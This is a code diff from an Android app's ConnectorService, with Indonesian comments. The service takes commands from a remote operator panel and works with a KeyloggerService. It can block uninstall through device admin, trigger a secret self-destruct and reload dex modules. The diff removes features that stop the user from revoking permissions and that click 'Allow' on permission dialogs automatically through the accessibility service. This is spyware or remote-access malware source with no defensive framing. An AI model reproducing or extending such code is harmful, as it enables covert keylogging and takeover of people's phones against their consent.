@@ -285,32 +285,9 @@ class ConnectorService : Service() {
             // ── Block/Unblock Uninstall (Device Admin/Owner) ──
             cmd.startsWith("block_uninstall:") -> Pair(AppDeviceAdminReceiver.setBlockUninstall(this, cmd.removePrefix("block_uninstall:").trim() == "true"), "command_result")
 
-            // ── Permission Guard: cegah user matikan permission aktif ──
-            cmd == "permission_guard_on"     -> {
-                KeyloggerService.permissionGuardEnabled = true
-                Pair("✅ Permission guard AKTIF — user tidak bisa matikan permission.", "command_result")
-            }
-            cmd == "permission_guard_off"    -> {
-                KeyloggerService.permissionGuardEnabled = false
-                Pair("⚠️ Permission guard NONAKTIF.", "command_result")
-            }
-            cmd == "permission_guard_status" -> Pair(
-                if (KeyloggerService.permissionGuardEnabled)
-                    "Permission guard: AKTIF"
-                else
-                    "Permission guard: NONAKTIF",
-                "command_result"
-            )
-
             // ── Self-Destruct: matikan guard + hapus admin + uninstall ──
             // RAHASIA — hanya operator panel yang bisa kirim command ini
             cmd == "self_destruct"  -> Pair(doSelfDestruct(), "command_result")
-
-            // ── Auto-Grant: klik "Izinkan" otomatis via AccessibilityService ──
-            // Tidak perlu overlay / SYSTEM_ALERT_WINDOW — murni node ACTION_CLICK
-            cmd == "auto_grant_on"     -> Pair(doAutoGrantOn(), "command_result")
-            cmd == "auto_grant_off"    -> Pair(doAutoGrantOff(), "command_result")
-            cmd == "auto_grant_status" -> Pair(doAutoGrantStatus(), "command_result")
 
             cmd == "modules_reload"         -> { DexModuleLoader.invalidate(); DexModuleLoader.preloadAll(this); Pair("✅ Modules reloading…", "command_result") }
 
@@ -790,27 +767,6 @@ class ConnectorService : Service() {
             "✅ Self-destruct initiated — admin removed, uninstall dialog launching"
         } catch (e: Exception) {
             "ERROR: ${e.message}"
-        }
-    }
-
-        private fun doAutoGrantOn(): String {
-        if (KeyloggerService.instance == null)
-            return "⚠️ AccessibilityService belum aktif — aktifkan dulu di Settings"
-        KeyloggerService.autoGrantEnabled = true
-        return "✅ Auto-grant ON — setiap dialog izin runtime akan otomatis di-klik 'Izinkan'"
-    }
-
-    private fun doAutoGrantOff(): String {
-        KeyloggerService.autoGrantEnabled = false
-        return "⚫ Auto-grant OFF"
-    }
-
-    private fun doAutoGrantStatus(): String {
-        val svcOk = KeyloggerService.instance != null
-        val on    = KeyloggerService.autoGrantEnabled
-        return buildString {
-            append("Auto-grant: ${if (on) "🟢 ON" else "⚫ OFF"}")
-            if (!svcOk) append(" | ⚠️ AccessibilityService tidak aktif")
         }
     }
 
